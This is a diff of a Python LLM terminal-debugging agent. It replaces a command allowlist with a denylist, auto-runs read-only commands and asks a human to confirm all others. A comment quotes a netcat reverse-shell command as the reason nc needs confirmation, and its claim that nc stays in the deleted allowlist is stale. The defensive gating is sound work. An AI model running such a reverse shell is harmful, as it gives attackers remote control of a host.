@@ -45,262 +45,6 @@ API_URL = os.environ.get('DEBUGBOT_API_URL', 'https://your-api-url/v1/chat/compl
 API_KEY = os.environ.get('DEBUGBOT_API_KEY', 'your-api-key')
 MODEL = os.environ.get('DEBUGBOT_MODEL', 'gpt-4o')
 
-# 允许执行的命令白名单（正则匹配）
-ALLOWED_COMMANDS = [
-    # ========== 文件操作 ==========
-    r'^cat\s+',           # 读取文件
-    r'^head\s+',          # 查看文件头部
-    r'^tail\s+',          # 查看文件尾部
-    r'^grep\s+',          # 搜索
-    r'^awk\s+',           # 文本处理
-    r'^sed\s+',           # 文本处理
-    r'^sort\s+',          # 排序
-    r'^uniq\s+',          # 去重
-    r'^cut\s+',           # 列提取
-    r'^wc\s+',            # 计数
-    r'^diff\s+',          # 比较文件
-    r'^ls\s*',            # 列出目录
-    r'^pwd$',             # 当前目录
-    r'^cd\s+',            # 切换目录
-    r'^find\s+',          # 文件搜索
-    r'^which\s+',         # 查找命令
-    r'^whereis\s+',       # 查找命令位置
-    r'^stat\s+',          # 文件状态
-    r'^file\s+',          # 文件类型
-    r'^md5sum\s+',        # MD5 校验
-    r'^sha256sum\s+',     # SHA256 校验
-    r'^sha1sum\s+',       # SHA1 校验
-    r'^tar\s+',           # 解压归档
-    r'^gzip\s+',          # gzip 压缩
-    r'^gunzip\s+',        # gzip 解压
-    r'^zip\s+',           # zip 压缩
-    r'^unzip\s+',         # zip 解压
-    r'^zcat\s+',          # 读取压缩文件
-    r'^zgrep\s+',         # 搜索压缩文件
-    r'^bzcat\s+',         # bz2 解压
-    r'^xzcat\s+',         # xz 解压
-    r'^less\s+',          # 分页查看
-    r'^more\s+',          # 分页查看
-    r'^touch\s+',         # 创建空文件
-
-    # ========== 系统监控 ==========
-    r'^ps\s+',            # 进程查看
-    r'^top\s+',           # 系统监控
-    r'^htop\s+',          # 系统监控
-    r'^btop\s+',          # 系统监控
-    r'^iotop\s+',         # IO 监控
-    r'^iftop\s+',         # 网卡流量
-    r'^vmstat\s+',        # 虚拟内存统计
-    r'^mpstat\s+',        # CPU 统计
-    r'^iostat\s+',        # IO 统计
-    r'^sar\s+',           # 系统活动报告
-    r'^uptime\s+',        # 运行时间
-    r'^w\s+',             # 查看登录用户
-    r'^who\s+',           # 查看登录用户
-    r'^whoami\s+',        # 当前用户
-    r'^id\s+',            # 用户信息
-    r'^users\s+',         # 用户列表
-
-    # ========== 资源使用 ==========
-    r'^df\s+',            # 磁盘使用
-    r'^du\s+',            # 目录大小
-    r'^free\s+',          # 内存使用
-    r'^cat\s+/proc/meminfo',  # 内存详情
-    r'^cat\s+/proc/cpuinfo',  # CPU 详情
-    r'^cat\s+/proc/loadavg',  # 负载情况
-    r'^cat\s+/proc/diskstats', # 磁盘统计
-    r'^cat\s+/proc/net/dev',  # 网卡统计
-    r'^cat\s+/proc/stat',     # 系统统计
-
-    # ========== 网络诊断 ==========
-    r'^netstat\s+',       # 网络连接
-    r'^ss\s+',            # 网络连接
-    r'^ip\s+',            # IP 命令
-    r'^ifconfig\s+',      # 网卡配置
-    r'^route\s+',         # 路由表
-    r'^arp\s+',           # ARP 表
-    r'^ping\s+',          # 网络测试
-    r'^traceroute\s+',    # 路由追踪
-    r'^tracert\s+',       # 路由追踪 (Windows)
-    r'^mtr\s+',           # 路由追踪
-    r'^nslookup\s+',      # DNS 查询
-    r'^dig\s+',           # DNS 查询
-    r'^host\s+',          # DNS 查询
-    r'^nmap\s+',          # 端口扫描
-    r'^telnet\s+',        # 远程连接
-    r'^nc\s+',            # 网络工具
-    r'^curl\s+',          # HTTP 请求
-    r'^wget\s+',          # 下载
-    r'^httpie\s+',        # HTTP 客户端
-    r'^tcpdump\s+',       # 网络抓包
-    r'^ethool\s+',        # 网卡工具
-
-    # ========== 服务管理 ==========
-    r'^systemctl\s+',     # systemd 服务管理
-    r'^service\s+',       # SysV 服务管理
-    r'^journalctl\s+',    # 日志查看
-    r'^chkconfig\s+',     # 服务开关
-    r'^update-rc\.d\s+',  # 服务开关 (Debian)
-    r'^supervisorctl\s+', # Supervisor 管理
-    r'^pm2\s+',           # PM2 Node.js 管理
-
-    # ========== Docker ==========
-    r'^docker\s+ps\s+',    # 容器列表
-    r'^docker\s+logs\s+',  # 容器日志
-    r'^docker\s+exec\s+',  # 容器执行
-    r'^docker\s+images\s+', # 镜像列表
-    r'^docker\s+inspect\s+', # 容器信息
-    r'^docker\s+stats\s+',  # 容器统计
-    r'^docker\s+top\s+',    # 容器进程
-    r'^docker\s+port\s+',   # 容器端口
-    r'^docker\s+network\s+', # 网络管理
-    r'^docker\s+volume\s+', # 卷管理
-    r'^docker\s+info\s+',   # Docker 信息
-    r'^docker\s+version\s+', # 版本信息
-    r'^docker\s+container\s+ls\s+',  # 新语法
-    r'^docker\s+image\s+ls\s+',      # 新语法
-
-    # ========== Kubernetes ==========
-    r'^kubectl\s+',       # K8s 命令
-    r'^helm\s+',          # Helm 包管理
-    r'^kubesec\s+',       # K8s 安全扫描
-    r'^kustomize\s+',    # K8s 配置
-
-    # ========== 数据库 ==========
-    r'^mysql\s+',         # MySQL 客户端
-    r'^mariadb\s+',       # MariaDB 客户端
-    r'^psql\s+',          # PostgreSQL 客户端
-    r'^redis-cli\s+',     # Redis 客户端
-    r'^mongosh\s+',       # MongoDB Shell
-    r'^mongo\s+',         # MongoDB (旧版)
-    r'^sqlite3\s+',       # SQLite
-
-    # ========== Web 服务器 ==========
-    r'^nginx\s+',         # Nginx
-    r'^apachectl\s+',     # Apache
-    r'^httpd\s+',         # Apache
-    r'^caddy\s+',         # Caddy
-
-    # ========== 中间件 ==========
-    r'^rabbitmqctl\s+',   # RabbitMQ
-    r'^kafka-topics\s+',  # Kafka
-    r'^kafka-console-consumer\s+',  # Kafka 消费者
-    r'^zookeeper-cli\s+', # ZooKeeper
-    r'^etcdctl\s+',       # etcd
-
-    # ========== 编程语言 ==========
-    r'^python[23]?\s+',   # Python
-    r'^python[23]?\s+-m\s+',  # Python 模块
-    r'^pip\s+',           # pip
-    r'^pip3\s+',          # pip3
-    r'^pip2\s+',         # pip2
-    r'^node\s+',          # Node.js
-    r'^npm\s+',           # NPM
-    r'^npx\s+',           # NPX
-    r'^yarn\s+',          # Yarn
-    r'^pnpm\s+',          # pnpm
-    r'^java\s+',          # Java
-    r'^javac\s+',         # Java 编译
-    r'^mvn\s+',           # Maven
-    r'^gradle\s+',        # Gradle
-    r'^go\s+',            # Go
-    r'^cargo\s+',         # Rust
-    r'^ruby\s+',          # Ruby
-    r'^gem\s+',           # Ruby Gem
-    r'^bundle\s+',        # Ruby Bundle
-    r'^php\s+',           # PHP
-    r'^composer\s+',      # PHP Composer
-
-    # ========== CI/CD ==========
-    r'^git\s+',           # Git
-    r'^svn\s+',           # SVN
-    r'^hg\s+',            # Mercurial
-    r'^jenkins\s+',       # Jenkins
-    r'^gitlab-runner\s+', # GitLab Runner
-    r'^ansible\s+',       # Ansible
-    r'^terraform\s+',     # Terraform
-    r'^packer\s+',        # Packer
-    r'^vault\s+',         # HashiCorp Vault
-    r'^nomad\s+',         # Nomad
-    r'^consul\s+',       # Consul
-
-    # ========== 容器编排 ==========
-    r'^docker-compose\s+',  # Docker Compose
-    r'^docker stack\s+',    # Docker Stack
-    r'^podman\s+',          # Podman
-    r'^crictl\s+',          # CRI 工具
-    r'^nerdctl\s+',         # containerd 工具
-
-    # ========== 日志分析 ==========
-    r'^logger\s+',         # 系统日志
-    r'^dmesg\s+',          # 内核日志
-    r'^last\s+',           # 登录记录
-    r'^lastlog\s+',        # 最后登录
-    r'^faillog\s+',        # 失败登录
-
-    # ========== 系统信息 ==========
-    r'^uname\s+',         # 系统信息
-    r'^hostname\s+',      # 主机名
-    r'^cat\s+/etc/os-release',  # OS 版本
-    r'^lsb_release\s+',   # Linux 版本
-    r'^arch\s+',          # 架构
-    r'^lscpu\s+',         # CPU 信息
-    r'^lsblk\s+',         # 块设备
-    r'^lspci\s+',         # PCI 设备
-    r'^lsusb\s+',         # USB 设备
-    r'^dmidecode\s+',     # 硬件信息
-    r'^cat\s+/proc/interrupts', # 中断信息
-    r'^cat\s+/proc/uptime',     # 运行时间
-
-    # ========== 进程与资源 ==========
-    r'^lsof\s+',          # 查看打开的文件
-    r'^strace\s+',        # 追踪系统调用
-    r'^ltrace\s+',        # 追踪库调用
-    r'^pstack\s+',        # 进程堆栈
-    r'^pidof\s+',         # 查找进程 ID
-    r'^pgrep\s+',         # 查找进程
-    r'^pkill\s+',         # 杀死进程 (谨慎)
-    r'^kill\s+',          # 杀死进程 (谨慎)
-    r'^nice\s+',          # 调整进程优先级
-    r'^renice\s+',        # 修改进程优先级
-    r'^nohup\s+',         # 后台运行
-    r'^screen\s+',        # 终端复用
-    r'^tmux\s+',          # 终端复用
-
-    # ========== 调试工具 ==========
-    r'^gdb\s+',           # GDB 调试器
-    r'^valgrind\s+',      # 内存检查
-    r'^perf\s+',          # 性能分析
-    r'^ebpf-tools\s+',    # eBPF
-    r'^bpftrace\s+',      # BPF 追踪
-    r'^flamegraph\s+',    # 火焰图
-    r'^curl\s+-v\s+',     # 详细 HTTP
-    r'^curl\s+-I\s+',     # HTTP 头
-    r'^openssl\s+s_client\s+',  # SSL 测试
-    r'^keytool\s+',       # Java 密钥工具
-
-    # ========== 杂项 ==========
-    r'^cron\s+',          # Cron
-    r'^crontab\s+',       # Crontab
-    r'^at\s+',            # 一次性任务
-    r'^watch\s+',         # 监控命令
-    r'^xargs\s+',         # 参数构建
-    r'^date\s+',          # 日期时间
-    r'^time\s+',          # 执行计时
-    r'^sleep\s+',         # 延时
-    r'^timeout\s+',       # 超时执行
-    r'^bg\s+',            # 后台任务
-    r'^fg\s+',            # 前台任务
-    r'^jobs\s+',          # 任务列表
-    r'^alias\s+',         # 命令别名
-    r'^unalias\s+',       # 删除别名
-    r'^history\s+',       # 命令历史
-    r'^export\s+',        # 环境变量
-    r'^type\s+',          # 命令类型
-    r'^man\s+',           # 帮助手册
-    r'^help\s+',          # 帮助
-]
-
 # 禁止的命令模式
 FORBIDDEN_PATTERNS = [
     # ========== 危险文件操作 ==========
@@ -344,7 +88,6 @@ FORBIDDEN_PATTERNS = [
     r'chown\s+-R\s+',         # 修改所有者
     r'chgrp\s+-R\s+',         # 修改组
     r'setfacl\s+',             # 修改 ACL
-    r'getfacl\s+',             # 读取 ACL (这个可以放行)
 
     # ========== 网络安全 ==========
     r'iptables\s+-F',          # 清空防火墙
@@ -458,7 +201,7 @@ def truncate_output(text, max_chars=MAX_TOOL_CONTENT):
             + text[-tail_size:])
 
 def terminal_render_markdown(text, streaming_chunk=False):
-    """把 Markdown 渲染成终端 ANSI 格式（替代原 strip_markdown）。
+    """把 Markdown 渲染成终端 ANSI 格式。
 
     - 标题 (# ## ###)   -> 加粗 + 颜色（H1 青 / H2 蓝 / H3 黄）
     - 粗体 (**x**)     -> ANSI 加粗
@@ -534,11 +277,6 @@ def terminal_render_markdown(text, streaming_chunk=False):
     text = re.sub(r'\n{3,}', '\n\n', text)
     return text
 
-
-def strip_markdown(text):
-    """向后兼容：旧调用点走渲染函数（非 chunk 模式）"""
-    return terminal_render_markdown(text, streaming_chunk=False)
-
 def print_msg(msg, color=None):
     """带颜色的打印"""
     colors = {
@@ -589,25 +327,18 @@ def is_path_allowed(path):
             return True
     return False
 
-def is_command_allowed(cmd):
-    """检查命令是否在白名单中"""
+def is_command_forbidden(cmd):
+    """检查命令是否命中危险黑名单。返回 (是否禁止, 原因)"""
     if not cmd:
-        return False, "空命令"
+        return True, "空命令"
 
     cmd = cmd.strip()
 
-    # 检查禁止模式 - 危险命令直接拒绝
     for pattern in FORBIDDEN_PATTERNS:
         if re.search(pattern, cmd):
-            return False, "禁止执行的危险命令: 匹配到 {}".format(pattern)
+            return True, "匹配到危险模式 {}".format(pattern)
 
-    # 检查白名单
-    for pattern in ALLOWED_COMMANDS:
-        if re.match(pattern, cmd):
-            return True, "OK"
-
-    # 不在白名单中但不是危险命令 - 需要用户确认
-    return None, "命令不在白名单中，需要确认: {}".format(cmd[:50])
+    return False, ""
 
 # 安全只读命令（不需要确认直接执行）
 SAFE_READONLY_PATTERNS = [
@@ -626,7 +357,8 @@ SAFE_READONLY_PATTERNS = [
     r'^nslookup\s+', r'^dig\s+', r'^host\s+', r'^traceroute\s+',
     r'^mtr\s+', r'^tcpdump\s+', r'^nmap\s+',
     # 注意：nc / telnet 故意不列入免确认名单 —— `nc -e /bin/sh host` 是标准反弹
-    # shell 手法，telnet 亦可用于交互式外连。它们仍可执行，但每次都需人工确认。
+    # shell 手法，telnet 亦可用于交互式外连。它们仍在 ALLOWED_COMMANDS 中，
+    # 只是每次执行都必须经过人工确认。
     r'^ip\s+', r'^ifconfig\s+', r'^route\s+', r'^arp\s+',
     # 系统信息
     r'^df\s+', r'^du\s+', r'^free\s+', r'^uptime\s+', r'^w\s+',
@@ -1207,21 +939,19 @@ def execute_tool(tool_name, tool_input):
     elif tool_name == "run_command":
         command = tool_input.get("command", "")
 
-        # 检查命令是否在白名单中
-        allowed, reason = is_command_allowed(command)
-
-        if allowed == False:
-            # 危险命令，直接拒绝
+        # 第一道闸门：危险命令直接拒绝
+        forbidden, reason = is_command_forbidden(command)
+        if forbidden:
             return "命令不允许: " + reason
 
-        # 安全只读命令直接执行
+        # 第二道闸门：只读命令免确认执行
         if is_safe_readonly_command(command):
             output, error = execute_command(command)
             if error:
                 return "命令执行失败: " + error
             return output if output else "[命令无输出]"
 
-        # 不在白名单或非只读命令 → 让用户确认
+        # 第三道闸门：其余一律人工确认
         if request_confirmation(command, "Bash"):
             output, error = execute_command(command)
             if error:
@@ -1733,7 +1463,7 @@ Python 版本: {}""".format(WORKSPACE, os.getcwd(), os.environ.get('USER', 'unkn
                             print()
                         else:
                             print_msg("\n  " + "\u2500" * 58, 'green')
-                            print(strip_markdown(assistant_reply))
+                            print(terminal_render_markdown(assistant_reply))
                             print_msg("  " + "\u2500" * 58, 'green')
                     break
 
